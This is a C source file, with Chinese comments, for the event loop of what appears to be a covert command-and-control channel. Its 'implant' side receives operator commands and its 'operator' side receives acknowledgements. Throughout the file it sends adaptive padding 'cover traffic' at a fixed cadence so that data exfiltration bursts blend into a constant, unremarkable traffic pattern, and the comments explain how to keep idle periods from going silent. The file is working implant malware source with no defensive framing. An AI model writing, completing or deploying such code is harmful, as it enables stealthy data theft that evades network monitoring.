/* cover_loop.c — 任务通道的真实事件循环（驱动覆盖流量） */

#include "cover_loop.h"

#include <errno.h>
#include <poll.h>
#include <string.h>

const char *exfil_cover_loop_errstr(int e) {
    switch (e) {
        case EXF_LOOP_OK:           return "ok";
        case EXF_LOOP_ERR_ARG:      return "invalid argument";
        case EXF_LOOP_ERR_IO:       return "i/o error";
        case EXF_LOOP_ERR_AUTH:     return "authentication failed";
        case EXF_LOOP_ERR_REPLAY:   return "replay detected";
        case EXF_LOOP_ERR_FMT:      return "cell format invalid";
        case EXF_LOOP_STOP:         return "stopped by callback";
        case EXF_LOOP_ERR_CLOSED:   return "peer closed";
        default:                    return "unknown";
    }
}

/* exfil_task_* 错误域 -> 本层错误域 */
static int map_task_err(int r) {
    switch (r) {
        case EXF_TASK_OK:            return EXF_LOOP_OK;
        case EXF_TASK_ERR_IO:        return EXF_LOOP_ERR_IO;
        case EXF_TASK_ERR_CLOSED:    return EXF_LOOP_ERR_CLOSED;
        case EXF_TASK_ERR_REPLAY:    return EXF_LOOP_ERR_REPLAY;
        case EXF_TASK_ERR_AUTH:      return EXF_LOOP_ERR_AUTH;
        default:                     return EXF_LOOP_ERR_FMT;
    }
}

int exfil_cover_loop_init(exfil_cover_loop_t *L, exfil_task_chan_t *ch,
                          exfil_loop_side_t side, int fd,
                          uint32_t profile, uint32_t budget_bpm,
                          uint32_t period_ms, uint32_t now_ms)
{
    if (!L || !ch || fd < 0) return EXF_LOOP_ERR_ARG;
    if (side != EXF_LOOP_IMPLANT && side != EXF_LOOP_OPERATOR)
        return EXF_LOOP_ERR_ARG;

    memset(L, 0, sizeof(*L));

    if (exfil_task_cover_init(&L->cov, profile, budget_bpm,
                              period_ms, now_ms) != EXF_TASK_COVER_OK)
        return EXF_LOOP_ERR_ARG;

    L->ch        = ch;
    L->side      = side;
    L->fd        = fd;
    L->period_ms = L->cov.period_ms;
    L->inited    = 1;
    return EXF_LOOP_OK;
}

int exfil_cover_loop_step(exfil_cover_loop_t *L, uint32_t now_ms, int poll_ms,
                          exfil_loop_cmd_fn on_cmd, exfil_loop_ack_fn on_ack,
                          void *ud, int *out_nev)
{
    struct pollfd p;
    int nev = 0, pr;

    if (!L || !L->inited || !L->ch || L->fd < 0) return EXF_LOOP_ERR_ARG;
    if (out_nev) *out_nev = 0;

    L->ticks++;

    p.fd      = L->fd;
    p.events  = POLLIN;
    p.revents = 0;

    pr = poll(&p, 1, poll_ms);
    if (pr < 0) {
        /* EINTR 视为"本轮无入站"，继续走覆盖；其余视为 IO 故障 */
        if (errno != EINTR) return EXF_LOOP_ERR_IO;
        pr = 0;
    }

    if (pr > 0 && (p.revents & POLLIN)) {
        int r;

        if (L->side == EXF_LOOP_IMPLANT) {
            uint64_t seq = 0;
            exfil_task_cmd_t c;
            memset(&c, 0, sizeof c);
            r = exfil_task_chan_recv_cmd(L->ch, L->fd, &seq, &c);
            if (r == EXF_TASK_PAD) {
                /* 硬规则 3：PAD 只计数，不派发、不改应用层状态 */
                L->pad_recv++;
                nev = 1;
            } else if (r == EXF_TASK_OK) {
                L->msg_recv++;
                nev = 1;
                if (on_cmd && on_cmd(ud, seq, &c) != 0) return EXF_LOOP_STOP;
            } else {
                return map_task_err(r);
            }
        } else {
            uint64_t seq = 0;
            exfil_task_ack_t a;
            memset(&a, 0, sizeof a);
            r = exfil_task_chan_recv_ack(L->ch, L->fd, &seq, &a);
            if (r == EXF_TASK_PAD) {
                L->pad_recv++;
                nev = 1;
            } else if (r == EXF_TASK_OK) {
                L->msg_recv++;
                nev = 1;
                if (on_ack && on_ack(ud, seq, &a) != 0) return EXF_LOOP_STOP;
            } else {
                return map_task_err(r);
            }
        }
    } else if (pr == 0) {
        L->idle_ticks++;
    }

    /*
     * 推进 EWMA 窗口。
     *
     * 必须显式调用：p2p_cover_take_due **不**推进窗口，而 task_cover 层
     * 也不调用 p2p_cover_tick。若不在这里推进，data_rate 的 EWMA 永远是
     * 初值 0，覆盖恒按"零数据"的满速率发送——数据突发时总线上速率
     * （数据+覆盖）会超出预算，且"自适应"名存实亡。
     */
    (void)p2p_cover_tick(&L->cov.cov, (uint64_t)now_ms * 1000ull);

    /*
     * 覆盖补发。tick 内部已累加 tc->cover_sent，此处**不可**重复累加，
     * 只取 nc 供诊断。
     */
    {
        size_t nc = 0;
        if (exfil_task_cover_tick(L->ch, &L->cov, L->fd, now_ms, &nc)
            != EXF_TASK_COVER_OK)
            return EXF_LOOP_ERR_IO;
        (void)nc;
        /* tick 只累加内层 tc->cover_sent，此处回读供外部观察（不重复累加） */
        L->cover_sent = L->cov.cover_sent;
    }

    if (out_nev) *out_nev = nev;
    return EXF_LOOP_OK;
}

int exfil_cover_loop_run(exfil_cover_loop_t *L,
                         exfil_loop_clock_fn clock_fn, void *clock_ud,
                         exfil_loop_cmd_fn on_cmd, exfil_loop_ack_fn on_ack,
                         void *ud, uint32_t run_ms)
{
    uint32_t start;
    uint64_t iter = 0;

    if (!L || !L->inited || !clock_fn) return EXF_LOOP_ERR_ARG;

    start = clock_fn(clock_ud);
    /*
     * 不得在此清零 stop：exfil_cover_loop_stop() 可能在 run 之前就被调用
     * （例如信号处理先到），清零会让"已请求停止"被吞掉，run 永远跑下去。
     * stop 的初值由 init 的 memset 保证为 0。
     */

    while (!L->stop) {
        uint32_t now = clock_fn(clock_ud);
        int r;

        /* 无符号减法：now 回绕仍得正确间隔 */
        if (run_ms && (uint32_t)(now - start) >= run_ms) break;
        if (++iter > EXF_LOOP_MAX_ITER) break;

        /*
         * 硬规则 1：poll 上限固定为 period_ms。
         * 用 -1（无限阻塞）会让覆盖只在有入站时才被顺带发出，
         * 空闲期依旧静默，等于没开覆盖。
         */
        r = exfil_cover_loop_step(L, now, (int)L->period_ms,
                                  on_cmd, on_ack, ud, NULL);
        if (r != EXF_LOOP_OK) return r;
    }
    return EXF_LOOP_OK;
}

void exfil_cover_loop_stop(exfil_cover_loop_t *L) {
    if (!L) return;
    L->stop = 1;
}

void exfil_cover_loop_wipe(exfil_cover_loop_t *L) {
    if (!L) return;
    /*
     * 只清本层状态。fd 由调用方关闭，ch（含密钥）由
     * exfil_task_chan_wipe 清理——本层不持有它们的所有权，
     * 在此关闭/清密钥会造成 double close 或 use-after-free。
     */
    exfil_task_cover_wipe(&L->cov);
    memset(L, 0, sizeof(*L));
}

uint32_t exfil_cover_loop_rate(const exfil_cover_loop_t *L) {
    if (!L || !L->inited) return 0;
    return exfil_task_cover_rate(&L->cov);
}

int exfil_cover_loop_note_data(exfil_cover_loop_t *L, uint32_t n_cells,
                               uint32_t now_ms)
{
    if (!L || !L->inited) return EXF_LOOP_ERR_ARG;
    if (n_cells == 0) return EXF_LOOP_OK;   /* 0 视作无效调用，非错误 */

    /* p2p_cover 内部以微秒计时，与 init/tick 保持同一换算 */
    if (p2p_cover_note_data(&L->cov.cov, n_cells,
                            (uint64_t)now_ms * 1000ull) != P2P_COVER_OK)
        return EXF_LOOP_ERR_ARG;
    return EXF_LOOP_OK;
}
